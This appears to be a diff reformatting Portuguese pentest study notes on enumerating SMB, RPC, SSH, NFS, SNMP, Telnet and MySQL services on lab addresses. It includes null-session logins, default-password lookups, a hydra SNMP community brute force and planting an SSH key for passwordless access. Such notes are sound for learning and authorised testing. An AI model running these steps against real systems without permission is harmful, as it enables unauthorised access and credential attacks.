+Lista os arquivos do host com smb ativo -N Loga como usuário anônimo -U para passar um usuário sem senha. Se usando uma ferramenta mais recente em hosts antigos use o parâmetro --option='client min protocol=NT1'
 
     smbcliente //192.168.2.101/filename 
 
-        Conecta diretamente ao arquivos/pasta do host
+Conecta diretamente ao arquivos/pasta do host
 
 
-Enumerando com RPC
+- Enumerando com RPC
+.
 
     rpcclient -U " " -N 172.16.1.5
 
-        Serve para conectar em servidores com acesso remoto disponível
+Serve para conectar em servidores com acesso remoto disponível
 
     Enumdomusers
 
-        Dentro do RPC client lista os usuários
+Dentro do RPC client lista os usuários
 
     queryuser usuário
 
-        Dentro do RPC lista as infos do Usuário
+Dentro do RPC lista as infos do Usuário
 
     Netshareenumall
 
-        Lista todos os compartilhamentos
+Lista todos os compartilhamentos
 
     Querydominfo
 
-        Mostra informações sobre o domínio
+Mostra informações sobre o domínio
 
-        Escalar Privilégios com RPCCLIENT: https://www.100security.com.br/rpcclient
+[Escalar Privilégios com RPCCLIENTÇ](https://www.100security.com.br/rpcclient)
 
 
 Ferramenta enumeração completa ENUM4LINUX
 
     enum4linux -U 192.168.2.101 
 
-        Faz a enumeração em busca de usuários e -a para buscar por tudo e -S para buscar por compartilhamentos, o -u permite passar o usuário para autenticação.
+Faz a enumeração em busca de usuários e -a para buscar por tudo e -S para buscar por compartilhamentos, o -u permite passar o usuário para autenticação.
 
     Linenum.sh 
 
-        Link da ferramenta https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
-
+[Link da ferramenta:](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
 
 Scripts em busca de informações e vulnerabilidades
 
     nmap -v --script=smb-enun-domains 192.168.2.100
 
-        Busca por domínios do host passado
+Busca por domínios do host passado
 
     nmap -v --script=smb-vuln-ms* 192.168.2.100
 
-        Verifica se o host tem a vulnerabilidade dos scripts passados o * o curinga para ele ler todos os scripts que tenham o mesmo prefixo   
+Verifica se o host tem a vulnerabilidade dos scripts passados o * o curinga para ele ler todos os scripts que tenham o mesmo prefixo   
 
 
 Script enumeração SMTP
@@ -1504,152 +1486,156 @@ Enumeração com TELNET
 
     telnet 192.168.2.10 
 
-        Conecta com a porta 23 para fazer login e encontra as senhas em cirt.net/passwords e/ou datarecovery.com/rd/default-passwords
+Conecta com a porta 23 para fazer login e encontra as senhas em cirt.net/passwords e/ou datarecovery.com/rd/default-passwords
 
 
-Enumerando com SSH
-
+- Enumerando com SSH
+.
     nc 172.16.1.1,2,5,120 22 
 
-        Captura o banner da porta e um possível SO
+Captura o banner da porta e um possível SO
 
     ssh -v 172.16.1.1,2,5,120 
 
-        Ssh em modo verbose com informações detalhadas informando as chaves de autenticação aceitas pelo servidor Local dos known hosts (/root/.ssh/known_hosts)
+SSH em modo verbose com informações detalhadas informando as chaves de autenticação aceitas pelo servidor Local dos known hosts (/root/.ssh/known_hosts)
 
 
-Subindo serviço de SSH
+- Subindo serviço de SSH
+.
 
     nano /etc/ssh/sshd_config 
+Arquivo de configuração  podendo alterar porta padrão assim como permitir acesso de login com usuário root PermitRootLogin Yes / PublickeyAuthentication (Server)
 
-        Arquivo de configuração  podendo alterar porta padrão assim como permitir acesso de login com usuário root PermitRootLogin Yes / PublickeyAuthentication (Server)
-
-        ssh-keygen seguido do caminho /home/user/Desktop na máquina que vai acessar o ssh  (Client)
+        ssh-keygen 
+Roda o comando seguido do caminho ´/home/user/Desktop´ na máquina que vai acessar o ssh  (Client)
 
     nano /etc/.ssh/authorized_keys 
-
-        Copiar os dados de id_rsa.pub gerado acima e cola no (Servidor)
+Copiar os dados de ´id_rsa.pub´ gerado acima e cola no (Servidor)
 
     ssh-add id_rsa 
+Adiciona a chave no host que vai conectar ao servidor ssh (Client)
 
-        Adiciona a chave no host que vai conectar ao servidor ssh (Client)
-    ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.35.233
-         Acessa o host com a chave em ambientes mais antigos
+	ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.35.233
+Acessa o host com a chave em ambientes mais antigos
 
 
 Nota: Criar usuário e colocar a chave pública dentro do servidor para ganhar acesso ao servidor ssh sem precisar da senha
 
-Enumerando Network File System (NFS) -P 2049
 
+- Enumerando Network File System (NFS) -P 2049
+.
+    
     rpcinfo -p 172.16.1.5 | grep nfs 
 
-        Enumera as informações da versão do NFS
+Enumera as informações da versão do NFS
 
     showmount -e 172.16.1.5 
 
-        Mostra os pontos de montagem do host
+Mostra os pontos de montagem do host
 
     mkdir /temp/nfs 
 
-        Cria a pasta para fazer a montagem  do diretório
+Cria a pasta para fazer a montagem  do diretório
 
     mount -t nfs -o nfsvers=2 172.16.1.5:/ /temp/nfs 
-
     sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 172.16.1.31:/home/camila /tmp/nfs/
 
-        Monta o host disponível no caminho criado usando o ponto de montagem do host descoberto anteriormente
+Monta o host disponível no caminho criado usando o ponto de montagem do host descoberto anteriormente
 
     cd /temp/nfs 
 
-        Vai para o diretório montado anteriormente
+Vai para o diretório montado anteriormente
 
     umount nfs 
 
-        Desmonta o ponto de montagem do host montado anteriormente.
+Desmonta o ponto de montagem do host montado anteriormente.
 
 
-Enumerando o SNMP - UDP 161
+- Enumerando o SNMP - UDP 161
 
 Nota: Usado para gerenciamento de rede basicamente, a Communit é a palavra secreta, o OID é o id do objeto e os MIBs são as infos, instalar o pacote de informações adicionais: apt install snmp-mibs-downloader. Para listar os usuários usa-se 1.3.6.1.2.1.6.13.1.3, Communitys padrões: public, private, cisco, manages, access, secret. Sites com informações relevantes alvestrand.no/objectid/1.3.6.1.2.1.html e oid-info.com
 
     onesixtyone -c lista.txt 172.16.1.0/24
 
-        Varre a rede em busca de serviços snmp ativos
+Varre a rede em busca de serviços snmp ativos
 
     snmpwalk -c public -v1 172.16.1.4 1.3.6.1.4.1.77.1.2.25 
 
-        Invade o host encontrado em busca de nomes de usuários
+Invade o host encontrado em busca de nomes de usuários
 
     apt install snmp-mibs-downloader 
 
-        Instalar o pacote de informações adicionais.
+Instalar o pacote de informações adicionais.
 
     echo "" > /etc/snmp/snmp.conf 
 
-        Configura o pacote instalado anteriormente
+Configura o pacote instalado anteriormente
 
     snmptranslate -IR sysUpTime 
 
-        Pega o Mib do UP time
+Pega o Mib do UP time
 
     snmptranslate -Td SNMPv2-MIB::sysUpTime 
-    	Lista detalhes do MIB descoberto no comando anterior
+
+Lista detalhes do MIB descoberto no comando anterior
 
     snmptranslate -TB icmp 
 
-        Exibe vários tipos de MIB de acordo com a pesquisa
+Exibe vários tipos de MIB de acordo com a pesquisa
 
     snmpwalk -c public -v1 172.16.1.4 IP-MIB::icmpInEchos 
 
-        Invade o Host mostrando a quantidade de pacotes ICMP enviados a ele.
+Invade o Host mostrando a quantidade de pacotes ICMP enviados a ele.
 
     snmp-check 172.16.1.4 -c public 
 
-        Carrega informações importantes da máquina com SNMP aberto
+Carrega informações importantes da máquina com SNMP aberto
 
     snmpwalk -c manager -v1 172.16.1.247 
 
-        Acessa com o nível de administrador
+Acessa com o nível de administrador
 
     snmpset -c manager -v1 172.16.1.247 SNMPv2-MIB::sysContact.o s "Desec" 
 
-        Altera a info de contact do serviço snmp do servidor.
+Altera a info de contact do serviço snmp do servidor.
+
     sudo hydra -P /usr/share/wordlists/metasploit/snmp_default_pass.txt 172.30.0.103 snmp
-        Bruteforce de community do snmp
-    nc -vz -u 10.1.0.100 53
-        NC para conexão udp com host
+
+Bruteforce de community do snmp
+
+	nc -vz -u 10.1.0.100 53
+
+NC para conexão udp com host
 
 
-Enumeração MySQL
+- Enumeração MySQL
+.
 
     mysql -h 172.16.1.5 -u root 
 
-        Conecta no MySQL usando o usuário root
+Conecta no MySQL usando o usuário root
 
     describe COLUMNS from <TABELA> 
 
-        Dentro do mysql descreve as tabelas
+Dentro do mysql descreve as tabelas
 
     show databases 
 
-        Dentro do mysql mostra as base de dados
+Dentro do mysql mostra as base de dados
 
     use databasename 
 
-        Dentro do mysql abre a base de dados
+Dentro do mysql abre a base de dados
 
     show tables 
 
-        Dentro do mysql mostra a lista de tabelas da base de dados
+Dentro do mysql mostra a lista de tabelas da base de dados
 
 
-    Site de comandos MySQL: 
-
-        http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm
+[Site de comandos MySQL:](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)
 
 
-
-    ANÁLISE DE VULNERABILIDADES
+## ANÁLISE DE VULNERABILIDADES
 
 
     Sites que têm exploits e informações de vulnerabilidades.
